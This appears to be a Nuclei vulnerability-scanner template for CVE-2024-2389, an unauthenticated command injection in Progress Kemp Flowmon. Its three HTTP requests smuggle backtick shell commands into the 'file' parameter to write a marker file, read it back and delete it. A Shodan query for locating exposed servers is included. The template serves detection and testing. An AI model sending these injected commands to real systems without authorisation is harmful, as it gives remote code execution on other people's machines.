id: CVE-2024-2389

info:
  name: Progress Kemp Flowmon - Command Injection
  author: pdresearch,parthmalhotra
  severity: critical
  description: |
    In Flowmon versions prior to 11.1.14 and 12.3.5, an operating system command injection vulnerability has been identified. An unauthenticated user can gain entry to the system via the Flowmon management interface, allowing for the execution of arbitrary system commands.
  reference:
    - https://support.kemptechnologies.com/hc/en-us/articles/24878235038733-CVE-2024-2389-Flowmon-critical-security-vulnerability
    - https://www.flowmon.com
    - https://twitter.com/wvuuuuuuuuuuuuu/status/1777977522140950640
    - https://github.com/adhikara13/CVE-2024-2389
    - https://github.com/nomi-sec/PoC-in-GitHub
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2024-2389
    cwe-id: CWE-78
    epss-score: 0.00043
    epss-percentile: 0.08267
  metadata:
    verified: true
    max-request: 1
    shodan-query: 'Server: Flowmon'
  tags: Flowmon

flow: |
  http("r0") && http("r1") && http("r2")

variables:
  filename: "{{rand_base(6)}}"
  randstr: "{{rand_base(10)}}"

http:
  - id: "r0"
    raw:
      - |
        GET /service.pdfs/confluence?lang=en&file=`echo+"{{randstr}}">{{filename}}.txt` HTTP/1.1
        Host: {{Hostname}}

        

    matchers:
      - type: dsl
        dsl:
          - status_code == 403
        internal: true
        condition: and

  - id: "r1"
    raw:
      - |
        GET /{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}

      
    matchers:
      - type: dsl
        dsl:
          - contains(body,"{{randstr}}")
        condition: and


  - id: "r2"
    raw:
      - |
        GET /service.pdfs/confluence?lang=en&file=`rm+{{filename}}.txt` HTTP/1.1
        Host: {{Hostname}}

      
    matchers:
      - type: dsl
        dsl:
          - status_code == 403
        internal: true
        condition: and

